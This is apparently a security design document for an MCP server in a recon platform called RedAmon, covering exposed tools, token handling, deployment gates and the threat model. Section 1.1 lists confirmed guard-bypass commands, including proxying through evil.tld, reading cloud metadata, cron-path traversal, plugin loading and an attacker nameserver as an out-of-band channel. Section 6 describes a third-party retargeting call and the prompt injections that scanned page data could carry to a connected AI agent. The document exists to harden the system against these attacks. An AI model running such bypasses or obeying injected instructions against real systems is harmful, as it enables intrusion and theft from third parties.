# RedAmon as an MCP Server (inbound)

RedAmon can expose itself to **external AI agents** over the Model Context
Protocol. A customer's own agent, an MCP-capable client, or a scripted pipeline
connects in, authenticates as **one RedAmon user**, and can do three things
scoped to that user's own projects: start a full recon pipeline, change a narrow
set of recon tuning settings, and query the attack-surface graph.

> **Two MCP features, opposite directions.** Do not confuse them.
>
> | | Direction | Where |
> | --- | --- | --- |
> | **MCP Tool Plugins** ([README.MCP.md](README.MCP.md)) | **outbound** — RedAmon is the *client* of servers you register | Global Settings → *MCP Tool Plugins* |
> | **MCP Server** (this document) | **inbound** — other agents are the *clients*, RedAmon is the *server* | Global Settings → *MCP Server* |

---

## 1. What is and is not exposed

**Exposed (thirteen tools).**

| Tool | What it does | Permission |
| --- | --- | --- |
| `list_projects` | The token owner's projects. Nothing else is visible. | `recon:read` |
| `get_recon_status` | Whether a scan is running, and its phase. | `recon:read` |
| `get_recon_settings` | The tuning subset this token may change. | `recon:read` |
| `graph_summary` | Count per node type + relationships present. | `recon:read` |
| `graph_schema` | What the graph *means*. No arguments, no data. | `recon:read` |
| `query_graph` | Ask the graph a question in natural language. | `recon:read` (+ `graph:cypher` for raw Cypher) |
| `kali_toolbox` | The Kali sandbox's installed toolset, by category. Reads code, not the container. | `recon:read` |
| `start_recon` | Start the full recon pipeline. | `recon:scan` (+ `recon:overwrite` for `mode:"overwrite"`) |
| `stop_recon` | Stop a running scan. | `recon:scan` |
| `update_recon_settings` | Change allowlisted recon tuning. | `recon:settings` |
| `kali_exec` | One allowlisted, scope-checked command in the sandbox. Not a shell. | `kali:exec` |
| `kali_output` | That command's output, paged from a byte cursor. | `kali:exec` |
| `kali_cancel` | Stop a command it started. | `kali:exec` |

**Deliberately not exposed:** the agent chat, a shell, partial recon, project
create/delete/import, secrets and LLM keys, target and scope fields, Rules of
Engagement, guardrails, GVM/TruffleHog/supply-chain/AI attack-surface scan
control, and any graph **write**.

`kali_toolbox` is served from the `kali_shell` `TOOL_REGISTRY` description via
the agent's `GET /kali/toolbox` (`require_internal_auth_only`), the same bytes
the in-app agent is prompted with: one source, so a catalogue cannot promise a
tool the image does not carry. It never calls the kali-sandbox, holds no
`MCP_AUTH_TOKEN`, and takes no `projectId`. Most of what it lists is **not**
reachable through `kali_exec`.

### 1.1 Why `kali_exec` is not `kali_shell`

`kali_shell` is `bash -c` on a container with `NET_ADMIN`, `NET_RAW`,
`seccomp:unconfined` and open egress. Inside the product that is contained by a
**human** clicking through the `DANGEROUS_TOOLS` confirmation
(`REQUIRE_TOOL_CONFIRMATION`, default on). An MCP token has no human, and
neither existing control covers the gap: the RoE gate
(`execute_plan_node._check_roe_blocked`) matches on **tool name only** and never
reads a command string, and the scope guardrail
(`initialize_node._run_scope_guardrail`) runs once per session against the
project's *configured* target. Neither would notice `nmap -sS victim.tld`, which
needs no settings write and so walks straight past the §6 allowlist.

`agentic/kali_exec_guard.py` is what stands in that place, and it is the security
boundary of the feature; everything else is plumbing.

#### It is deny-by-default over the FLAG surface, and that shape was earned

The first implementation pattern-matched arguments to guess which ones named a
host and let everything it did not recognise through. An adversarial review broke
it **ten ways in one pass**, every one the same root cause: *a token the guard
declined to recognise was a token nobody checked*, and the "a network tool must
name at least one in-scope host" rule meant one good argument laundered all the
others. Confirmed bypasses, all now regression-tested in
`BypassRegressionTests`:

```
curl --resolve=acme.tld:443:6.6.6.6 https://acme.tld/   two colons -> unparsed -> unchecked
curl -xevil.tld:8080 acme.tld                           attached short value -> skipped entirely
curl acme.tld evil.tld/                                 a trailing slash -> unparsed
curl acme.tld 169.254.169.254/latest/meta-data/         cloud metadata
curl -o /workspace/../etc/cron.d/pwn https://acme.tld/  prefix match, no normalisation
whatweb --plugins=+/tmp/p.rb https://acme.tld           loads Ruby from a writable dir
nikto -config /tmp/n.conf -h acme.tld                   config sets PLUGINDIR/EXECDIR/CLIOPTS
dig @evil.tld acme.tld                                  arbitrary nameserver, out-of-band channel
curl -K/tmp/c acme.tld                                  config file = arbitrary curl, including file://
```

So every binary now declares **each flag it accepts and the KIND of value that
flag takes** (`BOOL` / `HOST` / `PATH` / `OPAQUE` / `RRTYPE`). A token that is not
in the spec is refused by name. There are no unrecognised tokens left, so there
is nothing to launder.

| Rule | Refuses |
| --- | --- |
| Per-binary flag allowlist, typed values | Every flag not explicitly permitted, including attached short values (`-oFILE`) |
| Explicit denials with a reason | `--resolve`, `--connect-to`, `-x`, `-K`, `-L`, `--variable`, `--plugins`, `-config`, `--openssl` |
| Shell metacharacters (`; \| & $ ` `` ` `` ` > < ( ) \` + newline) | Pipelines, chaining, substitution, redirection |
| `shlex.split`, `argv[0]` has no `/` | Path-qualified or unparseable programs |
| Every HOST-typed value resolved, then scope- and RoE-checked | An out-of-scope target, in any syntax: path, userinfo, IPv6 literal, IDN lookalike |
| URL scheme is http(s) | `file://` (local read), `gopher://`/`dict://` (SSRF) |
| PATH values normalised, then confined | `..` traversal, relative paths, and **another project's** workspace subtree |
| A network binary must name a target | A command whose target is implied and so cannot be checked |
| Injected bounds the caller cannot drop | `--max-filesize`, `--max-time`, `--proto` on every curl |

**The binary rule is: read-only observers whose flags cannot load or run code.**
That is why `nmap` (`--script`), `sqlmap` (`--eval`), `nuclei` (`-t`),
`nc`/`socat`, `openssl` (`engine` loads shared objects) and every interpreter are
absent despite being installed. `test_kali_exec_guard.py` asserts each stays out,
so adding one is a deliberate act with a red test in front of it.

**Two things it cannot do, by construction.** A pre-flight string check cannot
see a redirect or a DNS answer, so `-L` is denied (the target would choose the
next hop) and a hostile in-scope DNS record still resolves where it likes.
Closing that class needs a runtime egress policy on the *resolved IP*, which
`scanners/capture_proxy/egress.py` already implements for the capture path.
Routing this egress through it would make the class unreachable even when the
parser is wrong, which it will be again. **Tracked, not done.**

Two things do the real work and are easy to mistake for each other. The
metacharacter check gives an early, legible refusal; the thing that actually
makes the transport safe is `shlex.join` re-quoting **every** argument before it
reaches `kali_shell`'s `bash -c` (the same fix as the `shlex.quote` in the
`/files` reader). The admitted, re-quoted form is what is echoed back and
audited, not what the caller typed.

Everything fails closed. An unreadable scope refuses rather than running
unchecked, an unconfigured project refuses rather than treating "no scope" as
"no limit", and the guard runs **only** in the agent: the webapp never inspects
or rewrites a command, because a second copy of these rules is the copy that
drifts.

Four independent switches must all be on, each owned by a different
decision-maker so no single compromise enables this:

1. `MCP_KALI_EXEC_ENABLED` — deployment, default off *even when the MCP server
   is on*, wired into the webapp compose `environment:` block (no `env_file`).
2. the `kali:exec` scope — mint-time, password-confirmed, off by default.
3. `project.mcpKaliExecEnabled` — a human in the project form, per engagement.
   Classified `'escalation'` in the settings denylist, so `update_recon_settings`
   refuses it **by name**: a token can never grant itself this. A row missing the
   column, or one that cannot be read, is not consent.
4. a configured target — nothing to scope-check against otherwise.

---

## 2. Turning it on

It is **off by default**. A new authenticated inbound surface must be switched on
deliberately, never inherited by upgrading.

```bash
# 1. In .env (redamon.sh writes the switch for you on install)
MCP_SERVER_ENABLED=true

# 2. Apply. The webapp has NO env_file, so this variable is read from the
#    compose `environment:` block - editing .env alone is not enough on its own,
#    but the block is already wired, so a normal restart picks it up.
docker compose up -d webapp
```

`redamon.sh` **refuses** to enable it while `INTERNAL_API_KEY` is unset or still
`changeme`. That is not a formality: the agent's auth fails *open* in that state
(`agentic/llm_guard.py` `_key_ok`) and the base compose publishes the agent on
`0.0.0.0:8090`, so the whole graph-isolation story would rest on a check that is
not running. Run `./redamon.sh install` to generate the secrets first.

### Knobs

All are optional; unset keeps the documented code default. All are wired into the
webapp's compose `environment:` block, because **the webapp has no `env_file`**
and a value set only in `.env` would be silently inert.

| Variable | Default | Meaning |
| --- | --- | --- |
| `MCP_SERVER_ENABLED` | `false` | The master switch. |
| `MCP_KALI_EXEC_ENABLED` | `false` | `kali_exec` / `kali_output` / `kali_cancel`. Independent of the master switch on purpose. |
| `MCP_RATE_EXEC_PER_MIN` | `20` | `kali_exec` calls per token per minute. Polling uses the read bucket. |
| `MCP_TOKEN_RETENTION_DAYS` | `90` | How long revoked/expired token rows are kept before pruning. |
| `MCP_RATE_READ_PER_MIN` | `120` | Cheap reads per token per minute. |
| `MCP_RATE_QUERY_PER_MIN` | `20` | `query_graph` calls per token per minute. |
| `MCP_RATE_WRITE_PER_MIN` | `10` | Settings/stop calls per token per minute. |
| `MCP_RATE_START_PER_WINDOW` | `1` | Scan starts per project per window. |
| `MCP_RATE_START_WINDOW_MS` | `300000` | That window (5 minutes). |
| `MCP_LLM_DAILY_BUDGET` | `200` | NL queries per token per day (they spend the owner's LLM key). |

Agent-side bounds (the agent **does** have an `env_file`, so `.env` reaches it):
`NEO4J_QUERY_TIMEOUT_MS` (120s), `GRAPH_EXEC_MAX_RECORDS` (1000),
`GRAPH_EXEC_MAX_BYTES` (2 MiB), `GRAPH_EXEC_MCP_CONCURRENCY` (2).

---

## 3. Minting a token

**Global Settings → MCP Server → New token.**

- **Minting is self-only**, judged on your real login identity. An admin viewing
  another user's settings sees the form disabled with a reason: a token minted
  that way would outlive the act-as session, need no further authentication, and
  be indistinguishable from the user's own calls. Admins *can* list, narrow and revoke;
  taking power away is a safe privilege, adding it is not.
- It asks for your **password again**. A stolen 7-day session cookie must not
  silently become a credential that outlives logout.
- **Permissions default to read-only.** Every write permission is opt-in, and
  each says what it allows. `recon:overwrite` says plainly that it permits
  discarding the current graph.
- **Expiry** defaults to 90 days. It is re-checked on *every call*, so expiry and
  revocation take effect mid-session rather than at the client's next reconnect.
- The token is shown **once**. Afterwards only its first 8 characters are ever
  displayed.

**Editing a token** (`PATCH /api/users/[id]/mcp-tokens/[tokenId]`) changes its
name, scopes and expiry (`expiry`: `30|60|90|365`, `"never"`, `"now"`, or a
`YYYY-MM-DD` date that lasts to the end of that day UTC). The hash and owner are
never mutable, and a revoked token can only be renamed. Edits are judged by
**direction**:

- **Narrowing** (drop a scope, earlier expiry, `"now"`, rename) keeps the admin
  bypass, like revoke.
- **Widening** (add a scope, later or no expiry, reviving an expired token) gets
  the mint's step-up: self-only on the real identity, password re-confirmed, and
  the same limiter key as minting, so the two share one attempt budget. Without
  this a stolen session cookie could upgrade an existing token into the
  credential it cannot mint. `isTokenWidening` in `webapp/src/lib/mcpAuth.ts` is
  the single rule, used by both the route and the tab.

Scopes and expiry are re-read on every MCP call, so an edit applies on the
agent's next call. Capability edits audit as `mcp-token.update` with
before/after values and `widened`.

**Any password change revokes every token** for that user, including an admin
reset (which needs no current password). A reset that left live programmatic
credentials behind would not actually lock the account.

---

## 4. Connecting a client

The mint dialog renders this pre-filled, so it is copy-paste with no editing:

```json
{
  "mcpServers": {
    "redamon": {
      "url": "https://<redamon-host>/api/mcp-server",
      "headers": { "Authorization": "Bearer rdmn_mcp_<token>" }
    }
  }
}
```

Client support for a **static bearer header on a remote MCP server** varies and
changes, so this document does not assert a list. **Verify your client end to
end before relying on it.** Claude Code, for example:

```bash
claude mcp add --transport http redamon https://<host>/api/mcp-server \
  --header "Authorization: Bearer rdmn_mcp_<token>"
```

---

## 5. Behind nginx (single-host deploy)

The deploy template ships an **exact-match** location plus its own rate zone:

```nginx
limit_req_zone $binary_remote_addr zone=mcp:10m rate=10r/s;
location = /api/mcp-server { ... }
```

Two things worth knowing before you edit it:

- The `=` is load-bearing. A prefix block written `location /api/mcp-server/`
  does **not** match the endpoint URL `/api/mcp-server`; the request silently
  falls through to `location /api/` with the UI rate zone.
- A location carrying any `add_header` does **not** inherit the server-level
  ones, so HSTS/CSP and `Cache-Control` are re-emitted inside the block. Remove
  them and they are silently lost on this endpoint.

**`GATE_MODE=basic_auth` is mutually exclusive with bearer auth** — Basic and
Bearer cannot both travel in one `Authorization` header. Under that mode the
endpoint returns **403 by default**. To open it:

```bash
MCP_EDGE_ALLOW_BEARER=true   # emits `auth_basic off` for this one location
```

### The firewall is a separate gate, and it comes FIRST

This is the step people miss. `MCP_EDGE_ALLOW_BEARER` controls nginx. It does not
control the firewall, and the firewall runs first.

`ufw` scopes the app port to `OPERATOR_ALLOW_CIDRS` whenever that is set (the
recommended posture). It filters by PORT and **cannot see the URL path**, so an
agent connecting from anywhere else is dropped before nginx is consulted at all.
On such a host, flipping `MCP_EDGE_ALLOW_BEARER` alone changes nothing and the
client simply times out.

```bash
MCP_CLIENT_CIDRS=198.51.100.0/24   # where your AGENT connects from
```

That admits those sources to the port, and the exact-match nginx location then
narrows them to `/api/mcp-server` only: they do not gain the UI, the login page
or the agent WebSocket paths.

With no `MCP_CLIENT_CIDRS`, the location inherits the server's `allow`/`deny`
unchanged: the operator gate **and** the token. That is the right posture when
the agent runs on the operator's own network, and the wrong one for a remote
agent.

Three gates, all of which must admit the agent: the cloud Security Group, `ufw`,
then nginx. `./deploy.sh verify` probes the endpoint and tells the failure modes
apart (404 disabled, 401 working, 403 edge gate). Repeated 401s are banned by the
`redamon-mcp-auth` fail2ban jail.

### http-* modes are refused

`deploy.sh` will not enable MCP in an `http-*` ACCESS_MODE, and `ALLOW_INSECURE=1`
does not override it. The credential is a bearer token in a header: over plaintext
it crosses the wire on every call and, unlike a session cookie, it outlives the
session, so one capture is a durable credential.

In `https-ip` with a self-signed certificate most MCP clients reject the
connection. Use a real certificate (`TLS_MODE=provided`) or a domain.

---

## 6. The security model

### Identity

A token resolves to exactly **one** `userId`. There is no admin act-as for
tokens. Every project-scoped tool calls an ownership check first, and a project
that does not exist and one owned by someone else give the **same** answer, so a
token holder cannot enumerate other users' project ids.

That check deliberately does **not** honour `ACCESS_ENFORCE`. The shared
browser-facing guard degrades an ownership violation to a logged warning when
`ACCESS_ENFORCE=0`; on a credentialed, internet-reachable surface that would be a
cross-tenant data breach toggled by an environment variable.

### The route is bearer-only

It ignores the session cookie, `X-Internal-Key` and `X-Scanner-Key`:

- honouring the cookie would make this middleware-exempt, state-changing POST
  **CSRF-reachable** from a logged-in operator's browser;
- honouring the scanner key would let a leaked token — held by *every* spawned
  scan container, the least-trusted tier — authenticate to the control plane.

It also requires `Content-Type: application/json`, rejects a foreign `Origin`,
rejects JSON-RPC batches, caps the body at 64 KiB, and answers `GET`/`DELETE`
with 405.

### The settings allowlist

`PUT /api/projects/[id]` spreads its body straight into `prisma.project.update`,
and `Project` has over 700 scalar columns — so anything that reaches it is
written. The MCP path therefore uses a **positive, frozen allowlist** of ~126
genuine tuning fields. Every numeric mirrors its ProjectForm min/max; a field
with no UI bound is not allowlisted. Unknown keys reject the **whole call by
name**, never silently.

The attack this prevents:

```
update_recon_settings({targetDomain: "victim.com", targetGuardrailEnabled: false})
start_recon()
```

which would turn a "rescan my own projects" credential into an
**attack-launching credential aimed at an arbitrary third party**. Scope,
Rules of Engagement, docker images, other scans' targets, egress toggles,
wordlists and templates, request headers, intrusiveness toggles, credentials and
agent settings are all denied by class, and a test asserts that every `Project`
column is classified — so a **new Prisma field is unreachable over MCP until
someone classifies it**. That staleness is the correct fail-closed cost.

### Prompt injection is expected

Everything the graph tools return is derived from scanner output about a live
target: page titles, headers, JS comments, certificate fields, findings text.
That data lands in the *external* agent's context, and that agent holds this
server's tools. Assume an instruction embedded in a page title reaches the model.

| What an injected instruction could try | What stops it |
| --- | --- |
| Redirect the platform at a new target | Scope fields are not writable at all; the call is rejected by name. |
| Discard the victim's graph history | `mode:"overwrite"` needs `recon:overwrite`, off by default. |
| Launch a scan storm | Strict per-token/per-project start bucket + the orchestrator's one-scan-per-project rule. |
| Escalate scan aggression | Every intrusiveness toggle is denied. |
| Exfiltrate another tenant's data | Ownership check + `scope_query` + result post-validation. |
| Exfiltrate secrets | No tool returns a credential. |
| Aim a command at a third party | `kali_exec` scope-checks every host the command names, before it runs. |
| Smuggle a second command | Allowlist admits nothing that loads or runs code; `shlex.join` re-quotes every argument. |
| Read the sandbox's own environment or keys | No interpreter or shell is allowlisted, and paths are confined to `/tmp/` and `/workspace/`. |
| Burn the owner's LLM budget | Per-token daily budget. |

The residual: a compromised external agent can do, within one user's own
projects, whatever that user's token already permits. That is inherent to
delegating a credential, and is why the default token is read-only.

### Result post-validation

Every node and relationship returned by a graph tool is re-checked against the
caller's tenant **on the way out**, and a violation drops the *whole* response
and writes an error-level audit record. This is defence in depth, not the primary
control — `scope_query` scopes the query server-side — but that filter has failed
once already (an unlabelled `MATCH (n)` once bypassed it), and on an
internet-reachable surface the same regression would be a *remote* cross-tenant
breach. Scalar projections carry no tenant keys to check; that residual is
accepted and bounded by `scope_query` alone.

---

## 7. Audit

Every call writes an `AuditLog` row: `mcp.<tool>`, the actor, the project, and
the token id and prefix. **Failures are audited too** — invalid, expired and
revoked token presentations (by prefix, never the token), scope denials,
ownership 404s and every post-validation violation — because that is the only way
a token brute force or a replayed revoked token becomes visible.

A `start_recon` also produces the normal `ScanJob` history row with
`initiatedByUserId` set to the token owner, and the audit record carries the
`scanJobId` so a run traces back to a token.

There is **no audit-log viewer in the product**: reconstruction is a SQL query
against `audit_log`. Known and accepted; a minimal admin view is a follow-up.

---

## 8. Operational notes

- **Settings apply to the NEXT scan.** Recon reads its settings once, at
  container spawn, so `update_recon_settings` refuses while a scan is writing the
  graph rather than accepting a write that would do nothing.
- **`start_recon` is stricter than the button.** It also refuses while a human is
  mid-session with the in-app agent or a triage run. Those are excluded from the
  normal check because a person running both is normal *and can see both*; an
  unattended external caller cannot, and a full scan would wipe the graph
  underneath them.
- **`mode:"new"` consumes a retention slot.** Old unpinned versions are trimmed
  past `SCAN_VERSION_RETENTION_KEEP` (default 20).
- **A dependency failure is never an empty result.** An unreachable orchestrator
  reports "status unknown", never "not running"; a graph failure never returns an
  empty summary. Conflating the two produces a false negative in a security tool.

---

## 9. Related

- [README.MCP.md](README.MCP.md) — the outbound direction (system MCP servers + MCP Tool Plugins)
- [README.GRAPH_DB.md](README.GRAPH_DB.md) — the attack-surface graph
- [graph_db/schema_sections.md](../../graph_db/schema_sections.md) — the node labels and relationships `graph_schema` serves
- [GRAPH.SCHEMA.md](GRAPH.SCHEMA.md) — why the graph is shaped this way (lists no labels)
